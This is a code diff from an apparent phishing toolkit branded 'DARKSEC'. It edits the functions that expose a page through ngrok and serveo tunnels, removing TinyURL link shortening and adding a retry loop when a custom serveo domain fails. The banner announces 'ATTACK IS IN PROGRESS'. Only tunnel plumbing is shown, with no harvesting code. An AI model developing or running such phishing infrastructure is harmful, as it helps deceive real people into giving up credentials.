@@ -112,9 +112,7 @@ def runNgrok():
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ ATTACK IS IN PROGRESS ]{1}!! {0}\n-------------------------------\n\n\n {0}[{1}*{0}]{1} Ngrok URL: {2}'''.format(RED, DEFAULT, GREEN) + url + '''{1}'''.format(RED, DEFAULT, GREEN))
-            link = check_output("curl -s 'http://tinyurl.com/api-create.php?url='"+url, shell=True).decode().replace('http', 'https')
-            print('''\n {0}[{1}*{0}]{1} TINYURL: {2}'''.format(RED, DEFAULT, GREEN) + link + '''{1}'''.format(RED, DEFAULT, GREEN))
-            print('''\n''')
+           
             break
 
 def runServeo():
@@ -137,16 +135,13 @@ def runServeo():
         url = str(output).strip("b ' \ n r")
         print("\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
         print("\n")
-        data = urlopen("http://tinyurl.com/api-create.php?url="+url)
-        url = data.read()
-        link = url.decode('utf-8')
-        print("\n{0}[{1}*{0}]{1} TINYURL: {2}".format(RED, DEFAULT, GREEN) + link + "{1}".format(RED, DEFAULT, GREEN))
-        print("\n")
+        
     except CalledProcessError:
-        print (_('''\n\n{0}FAILED !!!...{1}FAILED !!!..{0}FAILED !!!\n\n{0}[{1}!{0}]{0} Please Make Sure:\n{1} 1)~ If You are still connected to the Internet.\n 2)~ If You Have Chosen A {0}Valid{0}{1} Custom URL. \n     As Serveo Implemented More Security To Stop misuse of the service.\n 3)~ You Can Give another Try.\n\n\n{0}SCRIPT STOPPED {1}!! \n
+        print (_('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
 ''').format(RED, DEFAULT))
-        exit(0)
-          
+        sleep(4)
+        system('clear')
+        return runServeo()
 
 def runMainMenu(): #menu where user select what they wanna use
     
